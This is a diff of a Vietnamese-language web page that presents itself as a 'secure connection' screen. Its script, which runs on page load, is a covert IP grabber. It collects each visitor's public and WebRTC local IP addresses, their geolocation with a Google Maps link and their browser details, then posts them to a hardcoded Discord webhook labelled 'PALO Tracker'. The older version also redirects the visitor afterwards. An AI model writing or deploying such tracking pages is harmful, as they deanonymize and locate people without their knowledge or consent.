@@ -4,54 +4,47 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hệ thống bảo mật</title>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #0b0c10; color: #c5c6c7; text-align: center; padding-top: 50px; }
-        .loader { border: 4px solid #1f2833; border-top: 4px solid #45a29e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
 </head>
 <body>
     <h2>Đang khởi tạo kết nối an toàn...</h2>
-    <div class="loader"></div>
-    <p>Vui lòng không đóng trình duyệt.</p>
-
+    <div id="status" style="color: red; font-weight: bold;"></div>
     <script>
-    // CẤU HÌNH WEBHOOK DISCORD CỦA BẠN
+    // CẤU HÌNH WEBHOOK
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1573374675659137095/0zFbTOBMvUN80ZT5rr7ayRQEeN_uIe-FJmXPQPgDimMVXFeWS4QA3EEtrzeEOFX7Eoug";
 
-    // 1. LẤY THÔNG TIN IP VÀ VỊ TRÍ ĐỊA LÝ
-    async function fetchIPData() {
-        let data = { ip: "Không xác định", city: "Không xác định", region: "Không xác định", country: "Không xác định", isp: "Không xác định", lat: 0, lon: 0 };
+    // Hàm lấy thông tin IP và vị trí
+    async function fetchIPInfo() {
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const json = await res.json();
-            data = {
-                ip: json.ip,
-                city: json.city || "Không rõ",
-                region: json.region || "Không rõ",
-                country: json.country_name || "Không rõ",
-                isp: json.org || "Không rõ",
-                lat: json.latitude,
-                lon: json.longitude
+            const data = await res.json();
+            return {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                isp: data.org,
+                lat: data.latitude,
+                lon: data.longitude
             };
         } catch (e) {
             try {
                 const res = await fetch('https://ipinfo.io/json');
-                const json = await res.json();
-                data = {
-                    ip: json.ip,
-                    city: json.city || "Không rõ",
-                    region: json.region || "Không rõ",
-                    country: json.country || "Không rõ",
-                    isp: json.org || "Không rõ",
+                const data = await res.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country,
+                    isp: data.org,
                     lat: 0, lon: 0
                 };
-            } catch (err) { console.error("Lỗi API IP:", err); }
+            } catch (err) {
+                return { ip: "Lỗi API", city: "Lỗi", region: "Lỗi", country: "Lỗi", isp: "Lỗi", lat: 0, lon: 0 };
+            }
         }
-        return data;
     }
 
-    // 2. LẤY IP MẠNG NỘI BỘ QUA WEBRTC (Local IP)
+    // Hàm lấy IP nội bộ (Local IP)
     function getLocalIP() {
         return new Promise((resolve) => {
             const pc = new RTCPeerConnection({ iceServers: [] });
@@ -72,58 +65,58 @@
         });
     }
 
-    // 3. TỔNG HỢP VÀ GỬI VỀ DISCORD
-    async function sendToDiscord() {
-        const ipData = await fetchIPData();
-        const localIP = await getLocalIP();
+    // Hàm gửi dữ liệu
+    async function sendData() {
+        document.getElementById("status").innerText = "Đang lấy dữ liệu...";
         
-        // Tạo link Google Maps nếu có tọa độ
+        const ipData = await fetchIPInfo();
+        const localIP = await getLocalIP();
         const mapLink = (ipData.lat && ipData.lon) ? `https://www.google.com/maps?q=${ipData.lat},${ipData.lon}` : "Không có tọa độ";
 
         const embed = {
-            title: "🚨 CẢNH BÁO: CÓ NGƯỜI TRUY CẬP LINK",
-            color: 0xff0000,
+            title: "🚨 CẢNH BÁO TRUY CẬP",
+            color: 16711680,
             timestamp: new Date().toISOString(),
             fields: [
-                { name: "🌐 IP Công Cộng (Mạng)", value: `\`${ipData.ip}\``, inline: true },
-                { name: "🖧 IP Nội Bộ (Máy)", value: `\`${localIP}\``, inline: true },
+                { name: "🌐 IP Công Cộng", value: `\`${ipData.ip}\``, inline: true },
+                { name: "🖧 IP Nội Bộ", value: `\`${localIP}\``, inline: true },
                 { name: "🏙️ Thành Phố / Vùng", value: `${ipData.city}, ${ipData.region}`, inline: false },
                 { name: "🌍 Quốc Gia", value: `${ipData.country}`, inline: true },
-                { name: "🏢 Nhà Mạng (ISP)", value: `${ipData.isp}`, inline: true },
-                { name: "📍 Vị trí (Google Maps)", value: mapLink, inline: false },
-                { name: "💻 Thiết Bị / Trình Duyệt", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-                { name: "📺 Màn Hình", value: `${screen.width}x${screen.height}`, inline: true },
-                { name: "🗣️ Ngôn Ngữ", value: `${navigator.language}`, inline: true }
-            ],
-            footer: { text: "PALO System | Trackers" }
+                { name: "🏢 Nhà Mạng", value: `${ipData.isp}`, inline: true },
+                { name: "📍 Vị trí", value: mapLink, inline: false },
+                { name: "💻 Thiết Bị", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+            ]
         };
+
+        document.getElementById("status").innerText = "Đang gửi về Discord...";
 
         try {
             const response = await fetch(DISCORD_WEBHOOK_URL, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
+                headers: { 
+                    "Content-Type": "application/json"
+                },
                 body: JSON.stringify({
-                    username: "PALO Tracker Bot",
-                    avatar_url: "https://i.imgur.com/4M34hi2.png",
+                    username: "PALO Tracker",
                     embeds: [embed]
                 })
             });
-            
+
             if (response.ok) {
-                console.log("Gửi thành công");
-                // Chuyển hướng người dùng đến trang khác sau khi lấy xong data (tùy chọn)
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
+                document.getElementById("status").innerText = "Gửi thành công!";
+                document.getElementById("status").style.color = "green";
             } else {
-                console.error("Lỗi Webhook:", response.status);
+                // In lỗi chi tiết ra màn hình để debug
+                const errorText = await response.text();
+                document.getElementById("status").innerText = "Lỗi Discord: " + response.status + " - " + errorText;
             }
         } catch (error) {
-            console.error("Lỗi gửi request:", error);
+            document.getElementById("status").innerText = "Lỗi mạng (CORS/Block): " + error.message;
         }
     }
 
-    // Kích hoạt khi tải trang
     window.addEventListener("load", () => {
-        setTimeout(sendToDiscord, 500);
+        setTimeout(sendData, 500);
     });
     </script>
 </body>
